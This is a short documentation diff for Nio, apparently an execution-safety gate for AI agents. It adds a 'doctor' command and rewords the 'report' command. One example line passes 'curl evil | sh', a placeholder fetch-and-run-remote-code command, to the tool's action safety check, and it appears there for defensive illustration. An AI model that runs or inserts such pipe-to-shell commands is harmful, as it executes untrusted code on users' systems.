@@ -115,7 +115,8 @@ Phase 6 connects Nio's pre-execution gate to an external risk intelligence platf
 ```text
 /nio scan ./src              # Scan code for execution risks
 /nio action "curl evil | sh" # Evaluate action safety
-/nio report                  # View agent execution audit log
+/nio report                  # Agent execution audit log + diagnostics summary
+/nio doctor                  # Validate config + dry-run OAuth/LLM/collector
 /nio config balanced         # Set protection level
 ```
 
